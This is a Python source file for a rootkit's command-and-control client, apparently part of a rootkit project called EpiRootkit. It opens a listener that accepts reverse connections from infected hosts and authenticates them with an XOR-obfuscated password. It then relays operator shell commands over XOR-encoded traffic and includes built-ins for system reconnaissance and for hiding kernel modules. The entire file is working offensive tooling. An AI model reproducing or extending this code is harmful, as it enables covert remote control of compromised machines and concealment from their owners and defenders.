import argparse
import socket
import logging
import sys
import os
import time

XOR_KEY = 0x2A
EOF_MARKER = "--EOF--"


def xor_encrypt_decrypt(data: bytes) -> bytes:
    return bytes(b ^ XOR_KEY for b in data)


def clear_screen():
    os.system('clear')


class EpiRootkitClient:
    def __init__(self, host: str, port: int, password: str, debug: bool = False):
        self.host = host
        self.port = port
        self.password = password
        self.current_directory = "/"
        log_level = logging.DEBUG if debug else logging.INFO
        logging.basicConfig(level=log_level,
                            format='[%(levelname)s %(asctime)s] %(message)s',
                            datefmt='%Y-%m-%d %H:%M:%S')
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.server_socket.bind((self.host, self.port))
        except socket.error as e:
            logging.error(f"Failed to bind on {self.host}:{self.port} – {e}")
            sys.exit(1)
        self.server_socket.listen(1)
        logging.info(f"[*] Listening on {self.host}:{self.port} for incoming connections")

    def start(self):
        try:
            while True:
                conn, addr = self.server_socket.accept()
                logging.info(f"[+] Incoming connection from {addr[0]}:{addr[1]}")
                try:
                    authed = self._authenticate(conn)
                except Exception as e:
                    logging.error(f"Authentication error: {e}")
                    conn.close()
                    continue

                if not authed:
                    logging.warning("Authentication failed. Closing connection.")
                    conn.close()
                    continue

                logging.info("[+] Authentication successful")

                try:
                    self._handle_session(conn)
                except Exception as e:
                    logging.error(f"Session error: {e}")
                finally:
                    conn.close()
                    logging.info("[*] Connection closed. Waiting for reconnection...")
        except KeyboardInterrupt:
            logging.info("Server shutting down.")
        finally:
            self.server_socket.close()

    def _authenticate(self, conn: socket.socket) -> bool:
        pw_bytes = self.password.encode('utf-8')
        encrypted_pw = xor_encrypt_decrypt(pw_bytes)
        conn.sendall(encrypted_pw)
        conn.settimeout(5.0)
        try:
            data = conn.recv(1024)
        except socket.timeout:
            logging.error("Authentication response timed out.")
            return False
        finally:
            conn.settimeout(None)

        if not data:
            logging.error("Rootkit closed connection during authentication.")
            return False

        response = xor_encrypt_decrypt(data).decode('utf-8', errors='ignore').strip()
        logging.debug(f"Received auth response: {response}")
        return response == "OK"

    def _handle_session(self, conn: socket.socket):
        while True:
            try:
                cmd = input("epirootkit> ").strip()
            except EOFError:
                logging.info("Input stream closed. Ending session.")
                break

            if not cmd:
                continue

            if cmd.startswith("!"):
                self._handle_internal_command(conn, cmd)
                continue

            encrypted_cmd = xor_encrypt_decrypt(cmd.encode('utf-8'))
            try:
                conn.sendall(encrypted_cmd)
            except socket.error:
                logging.warning("Connection lost while sending command.")
                return

            buffer = ""
            try:
                while True:
                    data = conn.recv(4096)
                    if not data:
                        logging.warning("Connection lost while receiving command output.")
                        return
                    chunk = xor_encrypt_decrypt(data).decode('utf-8', errors='ignore')
                    buffer += chunk
                    if EOF_MARKER in chunk:
                        break
            except socket.error:
                logging.warning("Connection lost during response read.")
                return

            self._parse_and_display_response(cmd, buffer)

    def _parse_and_display_response(self, cmd: str, full_output: str):
        print(f"[INFO {time.strftime('%Y-%m-%d %H:%M:%S')}] Command: {cmd}")
        stdout = stderr = status = ""

        if "--STDERR--" in full_output:
            stdout, rest = full_output.split("--STDERR--", 1)
            if "--STATUS--" in rest:
                stderr, rest = rest.split("--STATUS--", 1)
                status, _ = rest.split(EOF_MARKER, 1)
        else:
            if "--STATUS--" in full_output:
                stdout, rest = full_output.split("--STATUS--", 1)
                status, _ = rest.split(EOF_MARKER, 1)

        for line in stdout.strip().splitlines():
            print(f"[OUTPUT] {line}")
        for line in stderr.strip().splitlines():
            print(f"[ERROR] {line}")

        if status:
            code = status.strip()
            label = "Success" if code == "0" else "Failure"
            print(f"[STATUS] Exit code: {code} ({label})")

    def _handle_internal_command(self, conn: socket.socket, cmd: str):
        if cmd == "!clear":
            clear_screen()
        elif cmd == "!ping":
            try:
                start = time.time()
                conn.sendall(xor_encrypt_decrypt(b"PING"))
                conn.settimeout(2.0)
                data = conn.recv(1024)
                conn.settimeout(None)
                if data:
                    resp = xor_encrypt_decrypt(data).decode().strip()
                    latency = (time.time() - start) * 1000
                    print(f"[INFO] Ping response: {resp} ({latency:.0f} ms)")
                else:
                    logging.warning("Empty ping response from rootkit.")
            except socket.timeout:
                logging.error("No ping response from rootkit.")
            except socket.error:
                logging.error("Connection error during ping.")
        elif cmd.startswith("!cd "):
            target = cmd[4:].strip()
            full_cmd = f"cd {target}"
            encrypted_cmd = xor_encrypt_decrypt(full_cmd.encode('utf-8'))
            conn.sendall(encrypted_cmd)
        elif cmd == "!sysinfo":
            encrypted_cmd = xor_encrypt_decrypt(b"uname -a; uptime; whoami")
            conn.sendall(encrypted_cmd)
        elif cmd.startswith("!hide "):
            mod = cmd[6:].strip()
            encrypted_cmd = xor_encrypt_decrypt(f"hide {mod}".encode('utf-8'))
            conn.sendall(encrypted_cmd)
        else:
            print("[INFO] Unknown internal command")


def main():
    parser = argparse.ArgumentParser(description="EpiRootkit attacking client")
    parser.add_argument("--host", required=True, help="Host to bind to")
    parser.add_argument("--port", required=True, type=int, help="Port to bind to")
    parser.add_argument("--password", default="secret", help="Password for authentication")
    parser.add_argument("--debug", action="store_true", help="Enable debug logging")
    args = parser.parse_args()

    client = EpiRootkitClient(args.host, args.port, args.password, args.debug)
    client.start()


if __name__ == "__main__":
    main()
